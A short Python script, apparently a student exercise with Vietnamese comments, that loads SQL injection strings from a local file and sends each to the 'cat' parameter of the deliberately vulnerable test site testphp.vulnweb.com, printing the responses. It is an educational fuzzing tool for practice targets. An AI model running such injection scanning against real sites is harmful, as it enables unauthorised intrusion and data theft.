#ìm kiếm lỗ hổng SQL Injection trong một trang web
import requests

domain = "http://testphp.vulnweb.com/listproducts.php?cat="

mySplAttacks = []

with open("D:\chuyennganh/nam3\ky2\kythuatlaptrinh\BtTuan20-2\Bai3\mySql.txt") as hanlder:
    for line in hanlder:
       mySplAttacks.append(line[:-1])

for sql in mySplAttacks:
    try:
        # thử gửi yêu cầu HTTP tới trang web đó với chuỗi tấn công SQL đó được chèn vào biến `cat`
        reponse = requests.get(domain + sql + "&minify=True").json()
        #Nếu yêu cầu HTTP trả về một trang có dạng JSON thì nó sẽ được in ra
        print(reponse)
    except Exception as err:
        print(err)
